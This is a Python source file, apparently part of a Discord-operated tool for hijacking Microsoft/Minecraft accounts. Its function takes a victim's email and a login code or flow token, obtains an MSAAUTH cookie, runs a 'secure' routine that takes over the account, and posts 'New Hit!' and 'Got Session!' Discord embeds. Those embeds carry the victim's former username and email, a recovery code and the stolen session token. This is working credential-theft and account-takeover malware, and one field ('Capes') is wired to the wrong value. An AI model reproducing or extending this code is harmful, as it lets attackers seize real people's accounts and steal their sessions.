from views.utils.getMSAAUTH import getMSAAUTH
from views.utils.secure import secure
from discord import Embed
import json

def startSecuringAccount(email: str, device: str = None, code: str = None):
    if not device:
        device = json.load(open("data.json", "r+"))["flowtoken"] 
    
    # str or None
    msaauth = getMSAAUTH(email, device, code)
    
    if msaauth is None:
        print("[-] - Failed to get MSAAUTH")
        return msaauth
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    account = secure(msaauth)
    print(account)

    hit_embed = Embed(
        title = f"New Hit!"
    )

    # To replace oldEmail -> Email
    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```")
    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
    hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
    hit_embed.add_field(name = "Capes:\n", value = f"```{account["method"]}```")
    hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")

    session_embed = Embed(
        title = "Got Session!",
        description = f"```{account["SSID"]}```"
    )

    return [hit_embed, session_embed]